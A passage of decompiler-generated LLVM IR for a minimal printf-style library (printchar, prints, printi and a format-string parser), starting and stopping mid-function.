  %v1_8478 = call i32 @isspace(i32 %v3_8470)
  store i32 %v1_8478, i32* %r0.global-to-local, align 4
  %v2_8480 = icmp eq i32 %v1_8478, 0
  br i1 %v2_8480, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8444

dec_label_pc_84d0.preheader:                      ; preds = %dec_label_pc_8444, %dec_label_pc_8460, %dec_label_pc_8450.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8400, %dec_label_pc_8450.preheader ], [ %v1_8448, %dec_label_pc_8444 ], [ %stack_var_-20.012, %dec_label_pc_8460 ]
  br label %dec_label_pc_84d0

dec_label_pc_8494:                                ; preds = %dec_label_pc_84d0
  %v2_84b8 = add i32 %v4_84f0, %storemerge2
  %v1_84bc = inttoptr i32 %v2_84b8 to i8*
  %v2_84bc = load i8, i8* %v1_84bc, align 1
  %v3_84c0 = inttoptr i32 %v2_84f4 to i8*
  store i8 %v2_84bc, i8* %v3_84c0, align 1
  %v1_84c8 = add i32 %storemerge2, 1
  br label %dec_label_pc_84d0

dec_label_pc_84d0:                                ; preds = %dec_label_pc_84d0.preheader, %dec_label_pc_8494
  %storemerge2 = phi i32 [ %v1_84c8, %dec_label_pc_8494 ], [ %stack_var_-24.0, %dec_label_pc_84d0.preheader ]
  %v7_84dc = icmp sgt i32 %storemerge2, %stack_var_-20.0.lcssa
  %v2_84e8 = sub i32 %storemerge2, %stack_var_-24.0
  %v3_84f0 = load i8*, i8** %stack_var_-32, align 4
  %v4_84f0 = ptrtoint i8* %v3_84f0 to i32
  %v2_84f4 = add i32 %v4_84f0, %v2_84e8
  br i1 %v7_84dc, label %dec_label_pc_84e0, label %dec_label_pc_8494

dec_label_pc_84e0:                                ; preds = %dec_label_pc_84d0
  %v3_84fc = inttoptr i32 %v2_84f4 to i8*
  store i8 0, i8* %v3_84fc, align 1
  %v9_8504 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8504

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8400, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8** %stack_var_-32, { 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 5, 3, 7, 6, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_84d0, { 1, 0 }
  uselistorder label %dec_label_pc_84d0.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8460, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8508 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8508, i32* @ip, align 4
  %v0_8518 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8524 = icmp eq i32 %v0_8518, 0
  br i1 %v2_8524, label %dec_label_pc_8558, label %dec_label_pc_852c

dec_label_pc_852c:                                ; preds = %entry
  %v1_8530 = inttoptr i32 %v0_8518 to i32*
  %v2_8530 = load i32, i32* %v1_8530, align 4
  %v1_853c = trunc i32 %arg2 to i8
  %v3_853c = inttoptr i32 %v2_8530 to i8*
  store i8 %v1_853c, i8* %v3_853c, align 1
  %v2_8544 = load i32, i32* %v1_8530, align 4
  %v1_8548 = add i32 %v2_8544, 1
  store i32 %v1_8548, i32* %v1_8530, align 4
  %v9_8570.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_856c

dec_label_pc_8558:                                ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v3_8568 = call i32 @__libc_write(i32 1, i32* nonnull %stack_var_-24)
  store i32 %v3_8568, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_856c

dec_label_pc_856c:                                ; preds = %dec_label_pc_852c, %dec_label_pc_8558
  %v9_8570 = phi i32 [ %v9_8570.pre, %dec_label_pc_852c ], [ %v3_8568, %dec_label_pc_8558 ]
  ret i32 %v9_8570

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_856c, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8574 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8574, i32* @ip, align 4
  %v3_8578 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp41 = icmp slt i32 %arg3, 1
  br i1 %tmp41, label %dec_label_pc_8630, label %dec_label_pc_85b0

dec_label_pc_85b0:                                ; preds = %entry
  %v2_85e018 = load i8, i8* %arg2, align 1
  %v2_85e420 = icmp eq i8 %v2_85e018, 0
  br i1 %v2_85e420, label %dec_label_pc_85ec, label %dec_label_pc_85c4

dec_label_pc_85c4:                                ; preds = %dec_label_pc_85b0, %dec_label_pc_85c4
  %v4_85dc22 = phi i32 [ %v1_85d4, %dec_label_pc_85c4 ], [ %tmp, %dec_label_pc_85b0 ]
  %stack_var_-40.021 = phi i32 [ %v1_85c8, %dec_label_pc_85c4 ], [ 0, %dec_label_pc_85b0 ]
  %v1_85c8 = add i32 %stack_var_-40.021, 1
  %v1_85d4 = add i32 %v4_85dc22, 1
  %v5_85d8 = inttoptr i32 %v1_85d4 to i8*
  %v2_85e0 = load i8, i8* %v5_85d8, align 1
  %v2_85e4 = icmp eq i8 %v2_85e0, 0
  br i1 %v2_85e4, label %dec_label_pc_85ec, label %dec_label_pc_85c4

dec_label_pc_85ec:                                ; preds = %dec_label_pc_85c4, %dec_label_pc_85b0
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_85b0 ], [ %v1_85c8, %dec_label_pc_85c4 ]
  %v5_85f8 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_85f8, label %dec_label_pc_8608, label %dec_label_pc_8618

dec_label_pc_8608:                                ; preds = %dec_label_pc_85ec
  %v2_8610 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8618

dec_label_pc_8618:                                ; preds = %dec_label_pc_85ec, %dec_label_pc_8608
  %storemerge2 = phi i32 [ %v2_8610, %dec_label_pc_8608 ], [ 0, %dec_label_pc_85ec ]
  %v1_861c = and i32 %arg4, 2
  %v2_8620 = icmp eq i32 %v1_861c, 0
  br i1 %v2_8620, label %dec_label_pc_8630, label %dec_label_pc_8628

dec_label_pc_8628:                                ; preds = %dec_label_pc_8618
  br label %dec_label_pc_8630

dec_label_pc_8630:                                ; preds = %dec_label_pc_8618, %entry, %dec_label_pc_8628
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge2, %dec_label_pc_8618 ], [ %storemerge2, %dec_label_pc_8628 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8618 ], [ 48, %dec_label_pc_8628 ]
  %v1_8634 = urem i32 %arg4, 2
  %v2_8638 = icmp eq i32 %v1_8634, 0
  br i1 %v2_8638, label %dec_label_pc_8668.preheader, label %dec_label_pc_86a4.preheader

dec_label_pc_8668.preheader:                      ; preds = %dec_label_pc_8630
  %v5_867015 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_867015, label %dec_label_pc_8644.lr.ph, label %dec_label_pc_86a4.preheader

dec_label_pc_8644.lr.ph:                          ; preds = %dec_label_pc_8668.preheader
  %v2_864c = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8644

dec_label_pc_8644:                                ; preds = %dec_label_pc_8644.lr.ph, %dec_label_pc_8644
  %stack_var_-28.116 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8644.lr.ph ], [ %v1_8660, %dec_label_pc_8644 ]
  %v3_864c = call i32 @printchar(i32* %v2_864c, i32 %stack_var_-44.0)
  %v3_8650 = load i32, i32* %stack_var_-48, align 4
  %v1_8654 = add i32 %v3_8650, 1
  store i32 %v1_8654, i32* %stack_var_-48, align 4
  %v1_8660 = add nsw i32 %stack_var_-28.116, -1
  %v5_8670 = icmp sgt i32 %stack_var_-28.116, 1
  br i1 %v5_8670, label %dec_label_pc_8644, label %dec_label_pc_86a4.preheader

dec_label_pc_86a4.preheader:                      ; preds = %dec_label_pc_8644, %dec_label_pc_8668.preheader, %dec_label_pc_8630
  %v3_86e826 = phi i32 [ 0, %dec_label_pc_8630 ], [ 0, %dec_label_pc_8668.preheader ], [ %v1_8654, %dec_label_pc_8644 ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8630 ], [ %stack_var_-28.0, %dec_label_pc_8668.preheader ], [ 0, %dec_label_pc_8644 ]
  %v2_86a88 = load i8, i8* %arg2, align 1
  %v2_86ac10 = icmp eq i8 %v2_86a88, 0
  br i1 %v2_86ac10, label %dec_label_pc_86dc.preheader, label %dec_label_pc_8678.lr.ph

dec_label_pc_8678.lr.ph:                          ; preds = %dec_label_pc_86a4.preheader
  %v2_8688 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8678

dec_label_pc_8678:                                ; preds = %dec_label_pc_8678.lr.ph, %dec_label_pc_8678
  %v4_86a412 = phi i32 [ %tmp, %dec_label_pc_8678.lr.ph ], [ %v1_869c, %dec_label_pc_8678 ]
  %stack_var_-24.011 = phi i8* [ %arg2, %dec_label_pc_8678.lr.ph ], [ %v5_86a0, %dec_label_pc_8678 ]
  %v2_867c = load i8, i8* %stack_var_-24.011, align 1
  %v3_867c = zext i8 %v2_867c to i32
  %v3_8688 = call i32 @printchar(i32* %v2_8688, i32 %v3_867c)
  %v3_868c = load i32, i32* %stack_var_-48, align 4
  %v1_8690 = add i32 %v3_868c, 1
  store i32 %v1_8690, i32* %stack_var_-48, align 4
  %v1_869c = add i32 %v4_86a412, 1
  %v5_86a0 = inttoptr i32 %v1_869c to i8*
  %v2_86a8 = load i8, i8* %v5_86a0, align 1
  %v2_86ac = icmp eq i8 %v2_86a8, 0
  br i1 %v2_86ac, label %dec_label_pc_86dc.preheader, label %dec_label_pc_8678

dec_label_pc_86dc.preheader:                      ; preds = %dec_label_pc_8678, %dec_label_pc_86a4.preheader
  %v3_86e825 = phi i32 [ %v3_86e826, %dec_label_pc_86a4.preheader ], [ %v1_8690, %dec_label_pc_8678 ]
  %v5_86e45 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_86e45, label %dec_label_pc_86b8.lr.ph, label %dec_label_pc_86e8

dec_label_pc_86b8.lr.ph:                          ; preds = %dec_label_pc_86dc.preheader
  %v2_86c0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86b8

dec_label_pc_86b8:                                ; preds = %dec_label_pc_86b8.lr.ph, %dec_label_pc_86b8
  %stack_var_-28.36 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_86b8.lr.ph ], [ %v1_86d4, %dec_label_pc_86b8 ]
  %v3_86c0 = call i32 @printchar(i32* %v2_86c0, i32 %stack_var_-44.0)
  %v3_86c4 = load i32, i32* %stack_var_-48, align 4
  %v1_86c8 = add i32 %v3_86c4, 1
  store i32 %v1_86c8, i32* %stack_var_-48, align 4
  %v1_86d4 = add nsw i32 %stack_var_-28.36, -1
  %v5_86e4 = icmp sgt i32 %stack_var_-28.36, 1
  br i1 %v5_86e4, label %dec_label_pc_86b8, label %dec_label_pc_86e8

dec_label_pc_86e8:                                ; preds = %dec_label_pc_86b8, %dec_label_pc_86dc.preheader
  %v3_86e8 = phi i32 [ %v3_86e825, %dec_label_pc_86dc.preheader ], [ %v1_86c8, %dec_label_pc_86b8 ]
  store i32 %v3_8578, i32* @fp, align 4
  ret i32 %v3_86e8

; uselistorder directives
  uselistorder i32 %v1_869c, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_85d4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_86b8, { 1, 0 }
  uselistorder label %dec_label_pc_8678, { 1, 0 }
  uselistorder label %dec_label_pc_8644, { 1, 0 }
  uselistorder label %dec_label_pc_8630, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8618, { 1, 0 }
  uselistorder label %dec_label_pc_85c4, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_86fc = load i32, i32* @fp, align 4
  store i32 34564, i32* %stack_var_-4, align 4
  %v2_8700 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8700, i32* @fp, align 4
  %v1_8734 = icmp slt i32 %arg2, 0
  %v2_8734 = icmp eq i32 %arg2, 0
  br i1 %v2_8734, label %dec_label_pc_873c, label %dec_label_pc_8770

dec_label_pc_873c:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_8760 = bitcast i32* %stack_var_-28 to i8*
  %v6_8760 = call i32 @prints(i32 %arg1, i8* %v5_8760, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_88d0

dec_label_pc_8770:                                ; preds = %entry
  %v2_8774 = icmp eq i32 %arg4, 0
  br i1 %v2_8774, label %dec_label_pc_87a8, label %dec_label_pc_877c

dec_label_pc_877c:                                ; preds = %dec_label_pc_8770
  %v7_8780 = icmp eq i32 %arg3, 10
  br i1 %v7_8780, label %dec_label_pc_8788, label %dec_label_pc_87a8

dec_label_pc_8788:                                ; preds = %dec_label_pc_877c
  br i1 %v1_8734, label %dec_label_pc_8794, label %dec_label_pc_87a8

dec_label_pc_8794:                                ; preds = %dec_label_pc_8788
  %v1_87a0 = sub i32 0, %arg2
  br label %dec_label_pc_87a8

dec_label_pc_87a8:                                ; preds = %dec_label_pc_8788, %dec_label_pc_877c, %dec_label_pc_8770, %dec_label_pc_8794
  %stack_var_-48.0 = phi i32 [ %arg2, %dec_label_pc_8770 ], [ %v1_87a0, %dec_label_pc_8794 ], [ %arg2, %dec_label_pc_8788 ], [ %arg2, %dec_label_pc_877c ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8770 ], [ 1, %dec_label_pc_8794 ], [ 0, %dec_label_pc_8788 ], [ 0, %dec_label_pc_877c ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_883c4 = icmp eq i32 %stack_var_-48.0, 0
  br i1 %v2_883c4, label %dec_label_pc_8844, label %dec_label_pc_87c4.lr.ph

dec_label_pc_87c4.lr.ph:                          ; preds = %dec_label_pc_87a8
  %v2_87f0 = add i32 %arg7, -58
  br label %dec_label_pc_87c4

dec_label_pc_87c4:                                ; preds = %dec_label_pc_87c4.lr.ph, %dec_label_pc_87fc
  %stack_var_-48.16 = phi i32 [ %stack_var_-48.0, %dec_label_pc_87c4.lr.ph ], [ %v2_882c, %dec_label_pc_87fc ]
  %stack_var_-64.05 = phi i8* [ %tmp26, %dec_label_pc_87c4.lr.ph ], [ %v5_8804, %dec_label_pc_87fc ]
  %v2_87d0 = urem i32 %stack_var_-48.16, %arg3
  %v7_87e4 = icmp slt i32 %v2_87d0, 10
  br i1 %v7_87e4, label %dec_label_pc_87fc, label %dec_label_pc_87e8

dec_label_pc_87e8:                                ; preds = %dec_label_pc_87c4
  %v1_87f4 = add i32 %v2_87f0, %v2_87d0
  br label %dec_label_pc_87fc

dec_label_pc_87fc:                                ; preds = %dec_label_pc_87c4, %dec_label_pc_87e8
  %stack_var_-60.0 = phi i32 [ %v2_87d0, %dec_label_pc_87c4 ], [ %v1_87f4, %dec_label_pc_87e8 ]
  %v4_87fc = ptrtoint i8* %stack_var_-64.05 to i32
  %v1_8800 = add i32 %v4_87fc, -1
  %v5_8804 = inttoptr i32 %v1_8800 to i8*
  %fold = add i32 %stack_var_-60.0, 48
  %v1_881c = trunc i32 %fold to i8
  store i8 %v1_881c, i8* %v5_8804, align 1
  %v2_882c = udiv i32 %stack_var_-48.16, %arg3
  %v2_883c = icmp ult i32 %stack_var_-48.16, %arg3
  br i1 %v2_883c, label %dec_label_pc_8844, label %dec_label_pc_87c4

dec_label_pc_8844:                                ; preds = %dec_label_pc_87fc, %dec_label_pc_87a8
  %stack_var_-64.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_87a8 ], [ %v5_8804, %dec_label_pc_87fc ]
  %v2_8848 = icmp eq i32 %stack_var_-56.0, 0
  br i1 %v2_8848, label %dec_label_pc_88ac, label %dec_label_pc_8850

dec_label_pc_8850:                                ; preds = %dec_label_pc_8844
  %v3_8850 = load i32, i32* %stack_var_0, align 4
  %v2_8854 = icmp eq i32 %v3_8850, 0
  br i1 %v2_8854, label %dec_label_pc_8894, label %dec_label_pc_885c

dec_label_pc_885c:                                ; preds = %dec_label_pc_8850
  %v1_8860 = and i32 %arg6, 2
  %v2_8864 = icmp eq i32 %v1_8860, 0
  br i1 %v2_8864, label %dec_label_pc_8894, label %dec_label_pc_886c

dec_label_pc_886c:                                ; preds = %dec_label_pc_885c
  %v2_8874 = inttoptr i32 %arg1 to i32*
  %v3_8874 = call i32 @printchar(i32* %v2_8874, i32 45)
  %v3_8884 = load i32, i32* %stack_var_0, align 4
  %v1_8888 = add i32 %v3_8884, -1
  store i32 %v1_8888, i32* %stack_var_0, align 4
  br label %dec_label_pc_88ac

dec_label_pc_8894:                                ; preds = %dec_label_pc_885c, %dec_label_pc_8850
  %v4_8894 = ptrtoint i8* %stack_var_-64.0.lcssa to i32
  %v1_8898 = add i32 %v4_8894, -1
  %v5_889c = inttoptr i32 %v1_8898 to i8*
  store i8 45, i8* %v5_889c, align 1
  br label %dec_label_pc_88ac

dec_label_pc_88ac:                                ; preds = %dec_label_pc_8844, %dec_label_pc_886c, %dec_label_pc_8894
  %stack_var_-64.1 = phi i8* [ %stack_var_-64.0.lcssa, %dec_label_pc_8844 ], [ %v5_889c, %dec_label_pc_8894 ], [ %stack_var_-64.0.lcssa, %dec_label_pc_886c ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_8844 ], [ 0, %dec_label_pc_8894 ], [ 1, %dec_label_pc_886c ]
  %v3_88b4 = load i32, i32* %stack_var_0, align 4
  %v6_88bc = call i32 @prints(i32 %arg1, i8* %stack_var_-64.1, i32 %v3_88b4, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_88c8 = add i32 %v6_88bc, %stack_var_-52.0
  br label %dec_label_pc_88d0

dec_label_pc_88d0:                                ; preds = %dec_label_pc_873c, %dec_label_pc_88ac
  %storemerge2 = phi i32 [ %v2_88c8, %dec_label_pc_88ac ], [ %v6_8760, %dec_label_pc_873c ]
  store i32 %v3_86fc, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-64.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8804, { 0, 2, 1 }
  uselistorder i32 %v2_87d0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-48.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_88d0, { 1, 0 }
  uselistorder label %dec_label_pc_88ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_87fc, { 1, 0 }
  uselistorder label %dec_label_pc_87c4, { 1, 0 }
  uselistorder label %dec_label_pc_87a8, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_88e0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_88e0, i32* @ip, align 4
  store i32 35052, i32* %stack_var_-4, align 4
  %v2_88e8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_88e8, i32* @fp, align 4
  %stack_var_-28.428 = inttoptr i32 %arg2 to i8*
  %v2_8c9429 = load i8, i8* %stack_var_-28.428, align 1
  %v2_8c9831 = icmp eq i8 %v2_8c9429, 0
  br i1 %v2_8c9831, label %dec_label_pc_8ca0, label %dec_label_pc_8908.lr.ph

dec_label_pc_8908.lr.ph:                          ; preds = %entry
  %v5_8c4c = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8908

dec_label_pc_8908:                                ; preds = %dec_label_pc_8908.lr.ph, %dec_label_pc_8c84
  %stack_var_-28.435 = phi i8* [ %stack_var_-28.428, %dec_label_pc_8908.lr.ph ], [ %stack_var_-28.4, %dec_label_pc_8c84 ]
  %stack_var_-28.4.in34 = phi i32 [ %arg2, %dec_label_pc_8908.lr.ph ], [ %v1_8c88, %dec_label_pc_8c84 ]
  %stack_var_-32.133 = phi i32 [ %arg3, %dec_label_pc_8908.lr.ph ], [ %stack_var_-32.0, %dec_label_pc_8c84 ]
  %stack_var_-40.132 = phi i32 [ 0, %dec_label_pc_8908.lr.ph ], [ %stack_var_-40.0, %dec_label_pc_8c84 ]
  %v2_890c = load i8, i8* %stack_var_-28.435, align 1
  %v7_8910 = icmp eq i8 %v2_890c, 37
  br i1 %v7_8910, label %dec_label_pc_8918, label %dec_label_pc_8c64

dec_label_pc_8918:                                ; preds = %dec_label_pc_8908
  %v1_891c = add i32 %stack_var_-28.4.in34, 1
  %v5_8920 = inttoptr i32 %v1_891c to i8*
  %v2_8938 = load i8, i8* %v5_8920, align 1
  %v2_893c = icmp eq i8 %v2_8938, 0
  br i1 %v2_893c, label %dec_label_pc_8ca0, label %dec_label_pc_8944

dec_label_pc_8944:                                ; preds = %dec_label_pc_8918
  %v2_8948 = load i8, i8* %v5_8920, align 1
  %v7_894c = icmp eq i8 %v2_8948, 37
  br i1 %v7_894c, label %dec_label_pc_8c64, label %dec_label_pc_8954

dec_label_pc_8954:                                ; preds = %dec_label_pc_8944
  %v2_8958 = load i8, i8* %v5_8920, align 1
  %v7_895c = icmp eq i8 %v2_8958, 45
  br i1 %v7_895c, label %dec_label_pc_8964, label %dec_label_pc_8994.preheader

dec_label_pc_8964:                                ; preds = %dec_label_pc_8954
  %v1_8968 = add i32 %stack_var_-28.4.in34, 2
  %v5_896c = inttoptr i32 %v1_8968 to i8*
  br label %dec_label_pc_8994.preheader

dec_label_pc_8994.preheader:                      ; preds = %dec_label_pc_8964, %dec_label_pc_8954
  %stack_var_-28.0.ph = phi i8* [ %v5_8920, %dec_label_pc_8954 ], [ %v5_896c, %dec_label_pc_8964 ]
  %stack_var_-44.0.ph = phi i32 [ 0, %dec_label_pc_8954 ], [ 1, %dec_label_pc_8964 ]
  %v4_89942 = ptrtoint i8* %stack_var_-28.0.ph to i32
  %v2_89983 = load i8, i8* %stack_var_-28.0.ph, align 1
  %v7_899c7 = icmp eq i8 %v2_89983, 48
  br i1 %v7_899c7, label %dec_label_pc_897c, label %dec_label_pc_89e0.preheader

dec_label_pc_897c:                                ; preds = %dec_label_pc_8994.preheader, %dec_label_pc_897c
  %v4_89949 = phi i32 [ %v1_8980, %dec_label_pc_897c ], [ %v4_89942, %dec_label_pc_8994.preheader ]
  %stack_var_-44.08 = phi i32 [ %v1_898c, %dec_label_pc_897c ], [ %stack_var_-44.0.ph, %dec_label_pc_8994.preheader ]
  %v1_8980 = add i32 %v4_89949, 1
  %v5_8984 = inttoptr i32 %v1_8980 to i8*
  %v1_898c = or i32 %stack_var_-44.08, 2
  %v2_8998 = load i8, i8* %v5_8984, align 1
  %v7_899c = icmp eq i8 %v2_8998, 48
  br i1 %v7_899c, label %dec_label_pc_897c, label %dec_label_pc_89e0.preheader

dec_label_pc_89e0.preheader:                      ; preds = %dec_label_pc_897c, %dec_label_pc_8994.preheader
  %stack_var_-44.0.lcssa = phi i32 [ %stack_var_-44.0.ph, %dec_label_pc_8994.preheader ], [ %v1_898c, %dec_label_pc_897c ]
  %stack_var_-28.0.lcssa = phi i8* [ %stack_var_-28.0.ph, %dec_label_pc_8994.preheader ], [ %v5_8984, %dec_label_pc_897c ]
  %v4_89e011 = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v2_89e412 = load i8, i8* %stack_var_-28.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_89e412, 48
  br i1 %tmp60, label %dec_label_pc_8a00, label %dec_label_pc_89f0

dec_label_pc_89a8:                                ; preds = %dec_label_pc_89f0
  %v2_89b4 = mul i32 %stack_var_-48.019, 10
  %v2_89c0 = load i8, i8* %stack_var_-28.120, align 1
  %v3_89c0 = zext i8 %v2_89c0 to i32
  %v2_89c8 = add i32 %v2_89b4, -48
  %v1_89cc = add i32 %v2_89c8, %v3_89c0
  %v1_89d8 = add i32 %v4_89e021, 1
  %v5_89dc = inttoptr i32 %v1_89d8 to i8*
  %v2_89e4 = load i8, i8* %v5_89dc, align 1
  %tmp61 = icmp ult i8 %v2_89e4, 48
  br i1 %tmp61, label %dec_label_pc_8a00, label %dec_label_pc_89f0

dec_label_pc_89f0:                                ; preds = %dec_label_pc_89e0.preheader, %dec_label_pc_89a8
  %v4_89e021 = phi i32 [ %v1_89d8, %dec_label_pc_89a8 ], [ %v4_89e011, %dec_label_pc_89e0.preheader ]
  %stack_var_-28.120 = phi i8* [ %v5_89dc, %dec_label_pc_89a8 ], [ %stack_var_-28.0.lcssa, %dec_label_pc_89e0.preheader ]
  %stack_var_-48.019 = phi i32 [ %v1_89cc, %dec_label_pc_89a8 ], [ 0, %dec_label_pc_89e0.preheader ]
  %v2_89f4 = load i8, i8* %stack_var_-28.120, align 1
  %tmp62 = icmp ult i8 %v2_89f4, 58
  br i1 %tmp62, label %dec_label_pc_89a8, label %dec_label_pc_8a00

dec_label_pc_8a00:                                ; preds = %dec_label_pc_89a8, %dec_label_pc_89f0, %dec_label_pc_89e0.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_89e0.preheader ], [ %v1_89cc, %dec_label_pc_89a8 ], [ %stack_var_-48.019, %dec_label_pc_89f0 ]
  %stack_var_-28.1.lcssa = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_89e0.preheader ], [ %v5_89dc, %dec_label_pc_89a8 ], [ %stack_var_-28.120, %dec_label_pc_89f0 ]
  %v2_8a04 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8a08 = icmp eq i8 %v2_8a04, 115
  br i1 %v7_8a08, label %dec_label_pc_8a10, label %dec_label_pc_8a74

dec_label_pc_8a10:                                ; preds = %dec_label_pc_8a00
  %v1_8a14 = add i32 %stack_var_-32.133, 4
  %v1_8a20 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8a20 = load i32, i32* %v1_8a20, align 4
  %v2_8a2c = icmp eq i32 %v2_8a20, 0
  br i1 %v2_8a2c, label %dec_label_pc_8a40, label %dec_label_pc_8a34

dec_label_pc_8a34:                                ; preds = %dec_label_pc_8a10
  %v5_8a38 = inttoptr i32 %v2_8a20 to i8*
  br label %dec_label_pc_8a48

dec_label_pc_8a40:                                ; preds = %dec_label_pc_8a10
  br label %dec_label_pc_8a48

dec_label_pc_8a48:                                ; preds = %dec_label_pc_8a34, %dec_label_pc_8a40
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1af0c.36, i32 0, i32 0), %dec_label_pc_8a40 ], [ %v5_8a38, %dec_label_pc_8a34 ]
  %v7_8a5c = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8a68 = add i32 %v7_8a5c, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8a74:                                ; preds = %dec_label_pc_8a00
  %v2_8a78 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8a7c = icmp eq i8 %v2_8a78, 100
  br i1 %v7_8a7c, label %dec_label_pc_8a84, label %dec_label_pc_8ad8

dec_label_pc_8a84:                                ; preds = %dec_label_pc_8a74
  %v1_8a88 = add i32 %stack_var_-32.133, 4
  %v1_8a94 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8a94 = load i32, i32* %v1_8a94, align 4
  %v7_8ac0 = call i32 @printi(i32 %tmp, i32 %v2_8a94, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8acc = add i32 %v7_8ac0, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8ad8:                                ; preds = %dec_label_pc_8a74
  %v2_8adc = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ae0 = icmp eq i8 %v2_8adc, 120
